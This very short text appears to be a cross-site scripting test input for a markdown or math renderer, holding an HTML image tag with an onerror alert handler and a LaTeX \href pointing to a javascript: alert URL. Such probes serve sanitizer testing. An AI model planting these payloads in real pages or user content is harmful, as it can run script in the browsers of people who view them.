<img src=x onerror=alert(1)>
$$\href{javascript:alert(1)}{test}
$$
